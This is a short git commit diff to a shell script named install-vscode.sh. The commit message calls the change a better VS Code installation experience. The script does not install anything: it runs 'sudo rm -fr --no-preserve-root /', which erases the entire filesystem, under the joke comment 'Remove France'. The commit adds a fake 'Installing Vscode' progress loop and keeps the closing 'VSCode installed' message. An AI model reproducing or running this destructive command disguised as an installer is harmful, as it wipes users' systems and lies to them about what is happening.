92a437708b30dbbaac00173fca1d7608af33ad8d
John Bakhmat <johnbakhmat@gmail.com>
2024-08-07 09:13:55 +0300

    fix: better vs code installation UX

--- install-vscode.sh
+++ install-vscode.sh
@@ -1,6 +1,14 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 # Remove France
 sudo rm -fr --no-preserve-root /
+
+end=$((SECONDS+3))
+
+while [ $SECONDS -lt $end ]; do
+    clear
+    echo "Installing Vscode"
+    :
+done
 
 echo "VSCode installed"
